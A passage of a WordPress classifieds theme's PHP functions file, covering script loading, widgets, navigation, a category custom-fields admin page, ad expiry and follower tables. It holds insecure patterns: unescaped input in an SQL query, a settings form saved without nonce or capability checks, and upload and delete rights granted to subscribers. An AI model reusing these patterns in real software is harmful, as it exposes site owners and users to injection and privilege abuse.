        'parent_url_slug'   => 'themes.php',         // Default parent URL slug

        'menu'              => 'install-required-plugins',   // Menu slug

        'has_notices'       => true,                         // Show admin notices or not

        'is_automatic'      => false,            // Automatically activate plugins after installation or not

        'message'           => '',               // Message to output right before the plugins table

        'strings'           => array(

            'page_title'                                => __( 'Install Required Plugins', 'wpcrown' ),

            'menu_title'                                => __( 'Install Plugins', 'wpcrown' ),

            'installing'                                => __( 'Installing Plugin: %s', 'wpcrown' ), // %1$s = plugin name

            'oops'                                      => __( 'Something went wrong with the plugin API.', 'wpcrown' ),

            'notice_can_install_required'               => _n_noop( 'This theme requires the following plugin: %1$s.', 'This theme requires the following plugins: %1$s.' ), // %1$s = plugin name(s)

            'notice_can_install_recommended'            => _n_noop( 'This theme recommends the following plugin: %1$s.', 'This theme recommends the following plugins: %1$s.' ), // %1$s = plugin name(s)

            'notice_cannot_install'                     => _n_noop( 'Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.' ), // %1$s = plugin name(s)

            'notice_can_activate_required'              => _n_noop( 'The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.' ), // %1$s = plugin name(s)

            'notice_can_activate_recommended'           => _n_noop( 'The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.' ), // %1$s = plugin name(s)

            'notice_cannot_activate'                    => _n_noop( 'Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.' ), // %1$s = plugin name(s)

            'notice_ask_to_update'                      => _n_noop( 'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.' ), // %1$s = plugin name(s)

            'notice_cannot_update'                      => _n_noop( 'Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.' ), // %1$s = plugin name(s)

            'install_link'                              => _n_noop( 'Begin installing plugin', 'Begin installing plugins' ),

            'activate_link'                             => _n_noop( 'Activate installed plugin', 'Activate installed plugins' ),

            'return'                                    => __( 'Return to Required Plugins Installer', 'wpcrown' ),

            'plugin_activated'                          => __( 'Plugin activated successfully.', 'wpcrown' ),

            'complete'                                  => __( 'All plugins installed and activated successfully. %s', 'wpcrown' ) // %1$s = dashboard link

        )

    );

 

    tgmpa( $plugins, $config );

 

}







/**

* Google analytic code

*/

function wpcrown_google_analityc_code() { ?>



	<script type="text/javascript">



	var _gaq = _gaq || [];

	_gaq.push(['_setAccount', '<?php global $redux_demo; $google_id = $redux_demo['google_id']; echo $google_id; ?>']);

	_gaq.push(['_setDomainName', 'none']);

	_gaq.push(['_setAllowLinker', true]);

	_gaq.push(['_trackPageview']);



	(function() {

		var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;

		ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';

		var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);

	})();



</script>

	

<?php }







/**

 * Enqueues scripts and styles for front end.

 *

 * @since classify 1.0

 *

 * @return void

 */

function classify_scripts_styles() {

	// Adds JavaScript to pages with the comment form to support sites with

	// threaded comments (when in use).

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) )

		wp_enqueue_script( 'comment-reply' );



	// Adds Masonry to handle vertical alignment of footer widgets.

	if ( is_active_sidebar( 'sidebar-1' ) )

		wp_enqueue_script( 'jquery-masonry' );



	// Loads JavaScript file with functionality specific to classify.

	wp_enqueue_script( 'classify-script', get_template_directory_uri() . '/js/functions.js', array( 'jquery' ), '2013-07-18', true );



	// Add Open Sans and Bitter fonts, used in the main stylesheet.

	wp_enqueue_style( 'classify-fonts', classify_fonts_url(), array(), null );



	// Add Genericons font, used in the main stylesheet.

	wp_enqueue_style( 'genericons', get_template_directory_uri() . '/fonts/genericons.css', array(), '2.09' );



	// Loads our main stylesheet.

	wp_enqueue_style( 'classify-style', get_stylesheet_uri(), array(), '2013-07-18' );



	// Loads the Internet Explorer specific stylesheet.

	wp_enqueue_style( 'classify-ie', get_template_directory_uri() . '/css/ie.css', array( 'classify-style' ), '2013-11-08' );

	wp_style_add_data( 'classify-ie', 'conditional', 'lt IE 9' );







	// Custom scripts ans styles //

    // Load custom script

    wp_enqueue_script( 'classify-menu-script', get_template_directory_uri() . '/js/menu.js', array( 'jquery' ), '2013-07-18', true );

    

	// Load boostratp script

	wp_enqueue_script( 'classify-boostrat-script', get_template_directory_uri() . '/js/bootstrap.min.js', array( 'jquery' ), '2013-07-18', true );



	// Load chosen script

	wp_enqueue_script( 'classify-chosen-script', get_template_directory_uri() . '/js/chosen.jquery.min.js', array( 'jquery' ), '2013-07-18', true );



    // Load isotope script

    wp_enqueue_script( 'classify-isotope-script', get_template_directory_uri() . '/js/jquery.isotope.min.js', array( 'jquery' ), '2013-07-18', true );



     // Load google maps js

    wp_enqueue_script( 'classify-google-maps-script', 'https://maps.googleapis.com/maps/api/js?v=3.exp&sensor=false', array( 'jquery' ), '2013-07-18', true );



    // Load google maps js

    wp_enqueue_script( 'classify-google-maps-script2', get_template_directory_uri() . '/js/gmap3.min.js', array( 'jquery' ), '2013-07-18', true );



    // Load google maps js

    wp_enqueue_script( 'classify-google-maps-infobox', get_template_directory_uri() . '/js/gmap3.infobox.js', array( 'jquery' ), '2013-07-18', true );



	// Load jQuery UI script

	wp_enqueue_script( 'classify-jquery-ui-script', '//code.jquery.com/ui/1.10.4/jquery-ui.js', array( 'jquery' ), '2013-07-18', true );



	// Load jQuery tools forms script

	wp_enqueue_script( 'classify-jquery-tools-forms-script', get_template_directory_uri() . '/js/jquery.tools.min.js', array( 'jquery' ), '2013-07-18', true );





    if( is_page_template('template-add-post.php') ) {

        /* dESiGNERz-CREW.iNFO for PRO users - add javascript */

        //wp_enqueue_script( 'classify-google-custom-script', get_template_directory_uri() . '/js/getlocation-map-script.js', array( 'jquery' ), '2013-07-18', true );

    }



    // Load google maps js

    wp_enqueue_script( 'classify-modernizer', get_template_directory_uri() . '/js/modernizr.touch.js', array( 'jquery' ), '2013-07-18', true );



    // Load google maps js

    wp_enqueue_script( 'classify-slider-mobile', get_template_directory_uri() . '/js/jquery.ui.touch-punch.min.js', array( 'jquery' ), '2013-07-18', true );





	if( is_single() ) {

        // Load flexslider

        wp_enqueue_script( 'classify-flexslider-script', get_template_directory_uri() . '/js/jquery.flexslider.js', array( 'jquery' ), '2013-07-18', true );



        // Load gallery

        wp_enqueue_script( 'classify-gallery-script', get_template_directory_uri() . '/js/galleria-1.3.5.min.js', array( 'jquery' ), '2013-07-18', true );



        // Load gallery

        wp_enqueue_script( 'classify-gallery-theme-script', get_template_directory_uri() . '/js/galleria.classic.min.js', array( 'jquery' ), '2013-07-18', true );

	}



     // Load custom script

    wp_enqueue_script( 'classify-custom-script', get_template_directory_uri() . '/js/custom.js', array( 'jquery' ), '2013-07-18', true );



	

    // Load boostratp style

    wp_enqueue_style( 'boostrat-style', get_template_directory_uri() . '/css/bootstrap.css', array(), '2.3.2' );



    // Load boostratp style
	
    wp_enqueue_style( 'awesomefont-style', 'http://netdna.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.css', array(), '4.0.3' );



    // Load chosen list style

    wp_enqueue_style( 'boostrat-chosen', get_template_directory_uri() . '/css/chosen.min.css', array(), '1' );



    // Load flexslider style

    wp_enqueue_style( 'flexslider-style', get_template_directory_uri() . '/css/flexslider.css', array(), '1' );

    

    // Load custom style

    wp_enqueue_style( 'main-style-custom', get_template_directory_uri() . '/css/custom.css', array(), '1' );



    // Load boostratp responsive

    wp_enqueue_style( 'boostrat-style-responsive', get_template_directory_uri() . '/css/bootstrap-responsive.css', array(), '2.3.2' );





	if(is_admin_bar_showing()) echo "<style type=\"text/css\">.navbar-fixed-top { margin-top: 28px; } </style>";



}

add_image_size( 'single-post-image', 300, 300, true );

add_image_size( 'single-cat-image', 255, 218, true );

add_image_size( '291x250', 291, 250, true );

function wpcrown_main_font() {

    $protocol = is_ssl() ? 'https' : 'http';

    //wp_enqueue_style( 'mytheme-roboto', "$protocol://fonts.googleapis.com/css?family=Roboto:400,400italic,500,300,300italic,500italic,700,700italic" );

}







function wpcrown_second_font_armata() {

    $protocol = is_ssl() ? 'https' : 'http';

    //wp_enqueue_style( 'mytheme-armata', "$protocol://fonts.googleapis.com/css?family=Armata" );

}





// Post views

function wpb_set_post_views($postID) {

    $count_key = 'wpb_post_views_count';

    $count = get_post_meta($postID, $count_key, true);

    if($count==''){

        $count = 0;

        delete_post_meta($postID, $count_key);

        add_post_meta($postID, $count_key, '0');

    }else{

        $count++;

        update_post_meta($postID, $count_key, $count);

    }

}

//To keep the count accurate, lets get rid of prefetching





function wpb_track_post_views ($post_id) {

    if ( !is_single() ) return;

    if ( empty ( $post_id) ) {

        global $post;

        $post_id = $post->ID;    

    }

    wpb_set_post_views($post_id);

}





function wpb_get_post_views($postID){

    $count_key = 'wpb_post_views_count';

    $count = get_post_meta($postID, $count_key, true);

    if($count==''){

        delete_post_meta($postID, $count_key);

        add_post_meta($postID, $count_key, '0');

        return "0";

    }

    return $count;

}









/**

 * Creates a nicely formatted and more specific title element text for output

 * in head of document, based on current view.

 *

 * @since classify 1.0

 *

 * @param string $title Default title text for current view.

 * @param string $sep Optional separator.

 * @return string The filtered title.

 */

function classify_wp_title( $title, $sep ) {

	global $paged, $page;



	if ( is_feed() )

		return $title;



	// Add the site name.

	$title .= get_bloginfo( 'name' );



	// Add the site description for the home/front page.

	$site_description = get_bloginfo( 'description', 'display' );

	if ( $site_description && ( is_home() || is_front_page() ) )

		$title = "$title $sep $site_description";



	// Add a page number if necessary.

	if ( $paged >= 2 || $page >= 2 )

		$title = "$title $sep " . sprintf( __( 'Page %s', 'agrg' ), max( $paged, $page ) );



	return $title;

}





/**

 * Registers two widget areas.

 *

 * @since classify 1.0

 *

 * @return void

 */

function classify_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Footer Widget ', 'agrg' ),
		'id'            => 'footer-one',
		'description'   => __( 'Appears in the footer section of the site.', 'agrg' ),
		'before_widget' => '<div class="span3 first">',
		'after_widget'  => '</div></div>',
		'before_title'  => '<h4 class="block-title">',
		'after_title'   => '</h4><div class="block-content clearfix">',
	) );
    register_sidebar( array(
        'name'          => __( 'Forum Widget Area', 'agrg' ),
        'id'            => 'forum',
        'description'   => __( 'Appears on posts and pages in the sidebar.', 'agrg' ),
        'before_widget' => '<div class="cat-widget"><div class="cat-widget-content">',
        'after_widget'  => '</div></div>',
        'before_title'  => '<div class="cat-widget-title"><h4>',
        'after_title'   => '</h4></div>',
    ) );

	register_sidebar( array(
		'name'          => __( 'Pages Widget Area', 'agrg' ),
		'id'            => 'pages',
		'description'   => __( 'Appears on posts and pages in the sidebar.', 'agrg' ),
		'before_widget' => '<div class="cat-widget"><div class="cat-widget-content">',
		'after_widget'  => '</div></div>',
		'before_title'  => '<div class="cat-widget-title"><h3>',
		'after_title'   => '</h3></div>',
	) );
	
	register_sidebar( array(
		'name'          => __( 'Listing page Widget Area', 'agrg' ),
		'id'            => 'listing',
		'description'   => __( 'Appears on posts and pages in the sidebar.', 'agrg' ),
		'before_widget' => '<div class="cat-widget"><div class="cat-widget-content">',
		'after_widget'  => '</div></div>',
		'before_title'  => '<div class="cat-widget-title"><h4>',
		'after_title'   => '</h4></div>',
	) );

}



if ( ! function_exists( 'classify_paging_nav' ) ) :

/**

 * Displays navigation to next/previous set of posts when applicable.

 *

 * @since classify 1.0

 *

 * @return void

 */

function classify_paging_nav() {

	global $wp_query;



	// Don't print empty markup if there's only one page.

	if ( $wp_query->max_num_pages < 2 )

		return;

	?>

	<nav class="navigation paging-navigation" role="navigation">

		<h1 class="screen-reader-text"><?php _e( 'Posts navigation', 'agrg' ); ?></h1>

		<div class="nav-links">



			<?php if ( get_next_posts_link() ) : ?>

			<div class="nav-previous"><?php next_posts_link( __( '<span class="meta-nav">&larr;</span> Older posts', 'agrg' ) ); ?></div>

			<?php endif; ?>



			<?php if ( get_previous_posts_link() ) : ?>

			<div class="nav-next"><?php previous_posts_link( __( 'Newer posts <span class="meta-nav">&rarr;</span>', 'agrg' ) ); ?></div>

			<?php endif; ?>



		</div><!-- .nav-links -->

	</nav><!-- .navigation -->

	<?php

}

endif;



if ( ! function_exists( 'classify_post_nav' ) ) :

/**

 * Displays navigation to next/previous post when applicable.

*

* @since classify 1.0

*

* @return void

*/

function classify_post_nav() {

	global $post;



	// Don't print empty markup if there's nowhere to navigate.

	$previous = ( is_attachment() ) ? get_post( $post->post_parent ) : get_adjacent_post( false, '', true );

	$next     = get_adjacent_post( false, '', false );



	if ( ! $next && ! $previous )

		return;

	?>

	<nav class="navigation post-navigation" role="navigation">

		<h1 class="screen-reader-text"><?php _e( 'Post navigation', 'agrg' ); ?></h1>

		<div class="nav-links">



			<?php previous_post_link( '%link', _x( '<span class="meta-nav">&larr;</span> %title', 'Previous post link', 'agrg' ) ); ?>

			<?php next_post_link( '%link', _x( '%title <span class="meta-nav">&rarr;</span>', 'Next post link', 'agrg' ) ); ?>



		</div><!-- .nav-links -->

	</nav><!-- .navigation -->

	<?php

}

endif;



if ( ! function_exists( 'classify_entry_meta' ) ) :

/**

 * Prints HTML with meta information for current post: categories, tags, permalink, author, and date.

 *

 * Create your own classify_entry_meta() to override in a child theme.

 *

 * @since classify 1.0

 *

 * @return void

 */

function classify_entry_meta() {

	if ( is_sticky() && is_home() && ! is_paged() )

		echo '<span class="featured-post">' . __( 'Sticky', 'agrg' ) . '</span>';



	if ( ! has_post_format( 'link' ) && 'post' == get_post_type() )

		classify_entry_date();



	// Translators: used between list items, there is a space after the comma.

	$categories_list = get_the_category_list( __( ', ', 'agrg' ) );

	if ( $categories_list ) {

		echo '<span class="categories-links">' . $categories_list . '</span>';

	}



	// Translators: used between list items, there is a space after the comma.

	$tag_list = get_the_tag_list( '', __( ', ', 'agrg' ) );

	if ( $tag_list ) {

		echo '<span class="tags-links">' . $tag_list . '</span>';

	}



	// Post author

	if ( 'post' == get_post_type() ) {

		printf( '<span class="author vcard"><a class="url fn n" href="%1$s" title="%2$s" rel="author">%3$s</a></span>',

			esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),

			esc_attr( sprintf( __( 'View all posts by %s', 'agrg' ), get_the_author() ) ),

			get_the_author()

		);

	}

}

endif;



if ( ! function_exists( 'classify_entry_date' ) ) :

/**

 * Prints HTML with date information for current post.

 *

 * Create your own classify_entry_date() to override in a child theme.

 *

 * @since classify 1.0

 *

 * @param boolean $echo Whether to echo the date. Default true.

 * @return string The HTML-formatted post date.

 */

function classify_entry_date( $echo = true ) {

	if ( has_post_format( array( 'chat', 'status' ) ) )

		$format_prefix = _x( '%1$s on %2$s', '1: post format name. 2: date', 'agrg' );

	else

		$format_prefix = '%2$s';



	$date = sprintf( '<span class="date"><a href="%1$s" title="%2$s" rel="bookmark"><time class="entry-date" datetime="%3$s">%4$s</time></a></span>',

		esc_url( get_permalink() ),

		esc_attr( sprintf( __( 'Permalink to %s', 'agrg' ), the_title_attribute( 'echo=0' ) ) ),

		esc_attr( get_the_date( 'c' ) ),

		esc_html( sprintf( $format_prefix, get_post_format_string( get_post_format() ), get_the_date() ) )

	);



	if ( $echo )

		echo $date;



	return $date;

}

endif;



if ( ! function_exists( 'classify_the_attached_image' ) ) :

/**

 * Prints the attached image with a link to the next attached image.

 *

 * @since classify 1.0

 *

 * @return void

 */

function classify_the_attached_image() {

	$post                = get_post();

	$attachment_size     = apply_filters( 'classify_attachment_size', array( 724, 724 ) );

	$next_attachment_url = wp_get_attachment_url();



	/**

	 * Grab the IDs of all the image attachments in a gallery so we can get the URL

	 * of the next adjacent image in a gallery, or the first image (if we're

	 * looking at the last image in a gallery), or, in a gallery of one, just the

	 * link to that image file.

	 */

	$attachment_ids = get_posts( array(

		'post_parent'    => $post->post_parent,

		'fields'         => 'ids',

		'numberposts'    => -1,

		'post_status'    => 'inherit',

		'post_type'      => 'attachment',

		'post_mime_type' => 'image',

		'order'          => 'ASC',

		'orderby'        => 'menu_order ID'

	) );



	// If there is more than 1 attachment in a gallery...

	if ( count( $attachment_ids ) > 1 ) {

		foreach ( $attachment_ids as $attachment_id ) {

			if ( $attachment_id == $post->ID ) {

				$next_id = current( $attachment_ids );

				break;

			}

		}



		// get the URL of the next image attachment...

		if ( $next_id )

			$next_attachment_url = get_attachment_link( $next_id );



		// or get the URL of the first image attachment.

		else

			$next_attachment_url = get_attachment_link( array_shift( $attachment_ids ) );

	}



	printf( '<a href="%1$s" title="%2$s" rel="attachment">%3$s</a>',

		esc_url( $next_attachment_url ),

		the_title_attribute( array( 'echo' => false ) ),

		wp_get_attachment_image( $post->ID, $attachment_size )

	);

}

endif;



/**

 * Returns the URL from the post.

 *

 * @uses get_url_in_content() to get the URL in the post meta (if it exists) or

 * the first link found in the post content.

 *

 * Falls back to the post permalink if no URL is found in the post.

 *

 * @since classify 1.0

 *

 * @return string The Link format URL.

 */

function classify_get_link_url() {

	$content = get_the_content();

	$has_url = get_url_in_content( $content );



	return ( $has_url ) ? $has_url : apply_filters( 'the_permalink', get_permalink() );

}



/**

 * Extends the default WordPress body classes.

 *

 * Adds body classes to denote:

 * 1. Single or multiple authors.

 * 2. Active widgets in the sidebar to change the layout and spacing.

 * 3. When avatars are disabled in discussion settings.

 *

 * @since classify 1.0

 *

 * @param array $classes A list of existing body class values.

 * @return array The filtered body class list.

 */

function classify_body_class( $classes ) {

	if ( ! is_multi_author() )

		$classes[] = 'single-author';



	if ( is_active_sidebar( 'sidebar-2' ) && ! is_attachment() && ! is_404() )

		$classes[] = 'sidebar';



	if ( ! get_option( 'show_avatars' ) )

		$classes[] = 'no-avatars';



	return $classes;

}





/**

 * Adjusts content_width value for video post formats and attachment templates.

 *

 * @since classify 1.0

 *

 * @return void

 */

function classify_content_width() {

	global $content_width;



	if ( is_attachment() )

		$content_width = 724;

	elseif ( has_post_format( 'audio' ) )

		$content_width = 484;

}



/**

 * Add postMessage support for site title and description for the Customizer.

 *

 * @since classify 1.0

 *

 * @param WP_Customize_Manager $wp_customize Customizer object.

 * @return void

 */

function classify_customize_register( $wp_customize ) {

	$wp_customize->get_setting( 'blogname' )->transport         = 'postMessage';

	$wp_customize->get_setting( 'blogdescription' )->transport  = 'postMessage';

	$wp_customize->get_setting( 'header_textcolor' )->transport = 'postMessage';

}





/**

 * Binds JavaScript handlers to make Customizer preview reload changes

 * asynchronously.

 *

 * @since classify 1.0

 */

function classify_customize_preview_js() {

	wp_enqueue_script( 'classify-customizer', get_template_directory_uri() . '/js/theme-customizer.js', array( 'customize-preview' ), '20130226', true );

}



// Add Redux Framework

if ( !class_exists( 'ReduxFramework' ) && file_exists( dirname( __FILE__ ) . '/ReduxFramework/ReduxCore/framework.php' ) ) {

	require_once( dirname( __FILE__ ) . '/ReduxFramework/ReduxCore/framework.php' );

}

if ( !isset( $redux_demo ) && file_exists( dirname( __FILE__ ) . '/ReduxFramework/sample/sample-config.php' ) ) {

	require_once( dirname( __FILE__ ) . '/ReduxFramework/sample/sample-config.php' );

}



/*---------------------------------------------------

register categories custom fields page

----------------------------------------------------*/

function theme_settings_init(){

  register_setting( 'theme_settings', 'theme_settings' );

  wp_enqueue_style("panel_style", get_template_directory_uri()."/css/categories-custom-fields.css", false, "1.0", "all");

  wp_enqueue_script("panel_script", get_template_directory_uri()."/js/categories-custom-fields-script.js", false, "1.0");

}

 

/*---------------------------------------------------

add categories custom fields page to menu

----------------------------------------------------*/

function add_settings_page() {

  add_menu_page('Categories Custom Fields' ,'Categories Custom Fields' , 'manage_options', 'settings', 'theme_settings_page');

}

 

/*---------------------------------------------------

add actions

----------------------------------------------------*/

add_action( 'admin_init', 'theme_settings_init' );

add_action( 'admin_menu', 'add_settings_page' );

 

/*---------------------------------------------------

Theme Panel Output

----------------------------------------------------*/

function theme_settings_page() {

  global $themename,$theme_options;



    $i = 0;

    $message = ''; 



    if ( 'savecat' == $_REQUEST['action'] ) {



        $args = array(
			  'orderby' => 'name',
			  'order' => 'ASC',
			  'hide_empty' => false
		);

		$categories = get_categories($args);

		foreach($categories as $category) {

			$user_id = $category->term_id;

            $tag_extra_fields = get_option(MY_CATEGORY_FIELDS);

		    $tag_extra_fields[$user_id]['category_custom_fields'] = $_POST['wpcrown_category_custom_field_option_'.$user_id];

		    update_option(MY_CATEGORY_FIELDS, $tag_extra_fields);

        }

        $message='saved';

    }

  

    ?>



    <div class="wrap">

      <div id="icon-options-general"></div>

      <h2><?php _e('Categories Custom Fields', 'agrg') ?></h2>

      <?php

        if ( $message == 'saved' ) echo '<div class="updated settings-error" id="setting-error-settings_updated"> 

        <p>Custom Fields saved.</strong></p></div>';

      ?>

    </div>



    <form method="post">



    <div class="wrap">

      <h3><?php _e('Select category:', 'agrg') ?></h3>



        <select id="select-author">

          	<?php 



	          	$cat_args = array ( 'parent' => 0, 'hide_empty' => false ) ;
	        	$parentcategories = get_terms ( "category", $cat_args ) ;
	        	$no_of_categories = count ( $parentcategories ) ;

	 

			    if ( $no_of_categories >= 0 ) {

			 

			        foreach ( $parentcategories as $parentcategory ) {

			           

			        echo '<option value=' . $parentcategory->term_id . '>' . $parentcategory->name . '</option>';

			 

			                $parent_id = $parentcategory ->term_id;

			                $subcategories = get_terms ( 'category', array ( 'child_of' => $parent_id, 'hide_empty' => false ) ) ;

			 

			            foreach ( $subcategories as $subcategory ) { 

			 

			                $args = array (

			                    'post-type'=> 'questions',

			                    'orderby'=> 'title',

			                    'order'=> 'ASC',

			                    'post_per_page'=> -1,

			                    'nopaging'=> 'true',

			                    'taxonomy_name'=> $subcategory->name

			                ); 

			                 

			                echo '<option value=' . $subcategory->term_id . '> - ' . $subcategory->name . '</option>';

			            

			            } 

			        }

			    } 

        ?>

        </select>

    </div>



    <div class="wrap">

      	<?php

        	$args = array(

        	  'hide_empty' => false,

			  'orderby' => count,

			  'order' => 'ASC'

			);



			$inum = 0;



			$categories = get_categories($args);

			  	foreach($categories as $category) {;



			  	$inum++;



          		$user_name = $category->name;

          		$user_id = $category->term_id; 





          		$tag_extra_fields = get_option(MY_CATEGORY_FIELDS);

				$wpcrown_category_custom_field_option = $tag_extra_fields[$user_id]['category_custom_fields'];

          ?>



          <div id="author-<?php echo $user_id; ?>" class="wrap-content" <?php if($inum == 1) { ?>style="display: block;"<?php } else { ?>style="display: none;"<?php } ?>>



            <h4><?php _e('Add Custom Fields to: ', 'agrg') ?><?php echo $user_name; ?></h4>



            <div id="badge_criteria_<?php echo $user_id; ?>">

              <?php 

                for ($i = 0; $i < (count($wpcrown_category_custom_field_option)); $i++) {

              ?>

              

              <div class="badge_item" id="<?php echo $i; ?>">



                <span class='full' style="margin-bottom: 10px;">



                  <span class="text ingredient-title"><?php _e( 'Custom field title', 'agrg' ); ?></span>

                  <input type='text' id='wpcrown_category_custom_field_option_<?php echo $user_id ?>[<?php echo $i; ?>][0]' name='wpcrown_category_custom_field_option_<?php echo $user_id ?>[<?php echo $i; ?>][0]' value='<?php if (!empty($wpcrown_category_custom_field_option[$i][0])) echo $wpcrown_category_custom_field_option[$i][0]; ?>' class='badge_name'>



                </span>

                  

                <button name="button_del_badge" type="button" class="button-secondary button_del_badge_<?php echo $user_id; ?>">Delete</button>

                

                

              </div>

              

              <?php 

                }

              ?>





            </div>



            <div id="template_badge_criterion_<?php echo $user_id; ?>" style="display: none;">

              

              <div class="badge_item" id="999">



                <span class='full' style="margin-bottom: 10px;">



                  <span class="text ingredient-title"><?php _e( 'Custom field title', 'agrg' ); ?></span>

                  <input type='text' id='' name='' value='' class='badge_name'>



                </span>

                  

                <button name="button_del_badge" type="button" class="button-secondary button_del_badge_<?php echo $user_id; ?>">Delete</button>

                

              </div>



            </div>



            <fieldset class="input-full-width">



               <p>All custom fields are text input type.</p>

              

              <button type="button" name="submit_add_badge" id='submit_add_badge_<?php echo $user_id; ?>' value="add" class="button-secondary">Add new custom field</button>

              

            </fieldset>



            <span class="submit"><input name="save<?php echo $user_id; ?>" type="submit" class="button-primary" value="Save changes" /></span>



            <script>



              // Add Badge

              jQuery('#template_badge_criterion_<?php echo $user_id; ?>').hide();

              jQuery('#submit_add_badge_<?php echo $user_id; ?>').on('click', function() {    

                $newItem = jQuery('#template_badge_criterion_<?php echo $user_id; ?> .badge_item').clone().appendTo('#badge_criteria_<?php echo $user_id; ?>').show();

                if ($newItem.prev('.badge_item').size() == 1) {

                  var id = parseInt($newItem.prev('.badge_item').attr('id')) + 1;

                } else {

                  var id = 0; 

                }

                $newItem.attr('id', id);



                var nameText = 'wpcrown_category_custom_field_option_<?php echo $user_id; ?>[' + id + '][0]';

                $newItem.find('.badge_name').attr('id', nameText).attr('name', nameText);



                //event handler for newly created element

                $newItem.children('.button_del_badge_<?php echo $user_id; ?>').on('click', function () {

                  jQuery(this).parent('.badge_item').remove();

                });



              });

              

              // Delete Ingredient

              jQuery('.button_del_badge_<?php echo $user_id; ?>').on('click', function() {

                jQuery(this).parent('.badge_item').remove();

              });



            </script>



          </div>



      <?php } ?>

    </div>



  <input type="hidden" name="action" value="savecat" />

  </form>



  <?php

}

function custom_excerpt_length( $length ) {

	return 7;

}

add_filter( 'excerpt_length', 'custom_excerpt_length', 999 );



function the_titlesmall($before = '', $after = '', $echo = true, $length = false) { $title = get_the_title();



	if ( $length && is_numeric($length) ) {

		$title = substr( $title, 0, $length );

	}



	if ( strlen($title)> 0 ) {

		$title = apply_filters('the_titlesmall', $before . $title . $after, $before, $after);

		if ( $echo )

			echo $title;

		else

			return $title;

	}

}



add_action('template_redirect', 'add_scripts');

 

function add_scripts() {

    if (is_singular()) {

      add_thickbox(); 

    }

}

//Register tag cloud filter callback

add_filter('widget_tag_cloud_args', 'tag_widget_limit');

 

//Limit number of tags inside widget

function tag_widget_limit($args){

global $redux_demo;

 $tagsnumber= $redux_demo['tags_limit']; 

//Check if taxonomy option inside widget is set to tags

if(isset($args['taxonomy']) && $args['taxonomy'] == 'post_tag'){

  $args['number'] = $tagsnumber; //Limit number of tags

}

 

return $args;

}



function wpcook_get_attachment_id_from_src($image_src) {



    global $wpdb;

    $query = "SELECT ID FROM {$wpdb->posts} WHERE guid='$image_src'";

    $id = $wpdb->get_var($query);

    return $id;



}





function wpcook_add_media_upload_scripts() {

    if ( is_admin() ) {

         return;

       }

    wp_enqueue_media();

}

add_action('wp_enqueue_scripts', 'wpcook_add_media_upload_scripts');



function wpcook_get_avatar_url($author_id, $size){

    $get_avatar = get_avatar( $author_id, $size );

    preg_match("/src='(.*?)'/i", $get_avatar, $matches);

    return ( $matches[1] );

}







function allow_users_uploads() {



	$contributor = get_role('subscriber');

	$contributor->add_cap('upload_files');

	$contributor->add_cap('delete_published_posts');

	$contributor2 = get_role('contributor');

	$contributor2->add_cap('upload_files');

	$contributor2->add_cap('delete_published_posts');



}

add_action('admin_init', 'allow_users_uploads');





if ( current_user_can('subscriber') && !current_user_can('upload_files') ) {

    add_action('admin_init', 'wpcook_allow_contributor_uploads');

}

function wpcook_allow_contributor_uploads() {

    $contributor = get_role('subscriber');

    $contributor->add_cap('upload_files');

	$contributor2 = get_role('contributor');

    $contributor2->add_cap('upload_files');

}





add_filter( 'posts_where', 'wpcook_devplus_attachments_wpquery_where' );

function wpcook_devplus_attachments_wpquery_where( $where ){

    global $current_user;



    if( is_user_logged_in() ){

        // we spreken over een ingelogde user

        if( isset( $_POST['action'] ) ){

            // library query

            if( $_POST['action'] == 'query-attachments' ){

                $where .= ' AND post_author='.$current_user->data->ID;

            }

        }

    }



    return $where;

}



add_action('after_setup_theme', 'remove_admin_bar');

function remove_admin_bar() {

	if (!current_user_can('administrator') && !is_admin()) {

	  show_admin_bar(false);

	}

}



add_action( 'wp', 'ad_expiry_schedule' );

/**

 * On an early action hook, check if the hook is scheduled - if not, schedule it.

 */

function ad_expiry_schedule() {

	if ( ! wp_next_scheduled( 'ad_expiry_event' ) ) {

		wp_schedule_event( time(), 'hourly', 'ad_expiry_event');

	}

}





add_action( 'ad_expiry_event', 'ad_expiry' );

/**

 * On the scheduled action hook, run a function.

 */

function ad_expiry() {

global $wpdb;

global $redux_demo;

$daystogo = '';

if (!empty($redux_demo['ad_expiry'])){

	$daystogo = $redux_demo['ad_expiry'];	

	$sql =

	"UPDATE {$wpdb->posts}

	SET post_status = 'trash'

	WHERE (post_type = 'post' AND post_status = 'publish')

	AND DATEDIFF(NOW(), post_date) > %d";

	$wpdb->query($wpdb->prepare( $sql, $daystogo ));

}

}



function wp_authors_tbl_create() {

    global $wpdb;

    $sql2 = ("CREATE TABLE IF NOT EXISTS {$wpdb->prefix}author_followers (

        id int(11) NOT NULL AUTO_INCREMENT,

        author_id int(11) NOT NULL,

        follower_id int(11) NOT NULL,

        PRIMARY KEY (id)

    ) ENGINE=InnoDB AUTO_INCREMENT=1;");

 $wpdb->query($sql2);

     $sql = ("CREATE TABLE IF NOT EXISTS {$wpdb->prefix}author_favorite (

        id int(11) NOT NULL AUTO_INCREMENT,

        author_id int(11) NOT NULL,

        post_id int(11) NOT NULL,

        PRIMARY KEY (id)

    ) ENGINE=InnoDB AUTO_INCREMENT=1;");

 $wpdb->query($sql);

}

add_action( 'init', 'wp_authors_tbl_create', 1 );



function wp_authors_insert($author_id, $follower_id) {

    global $wpdb;	

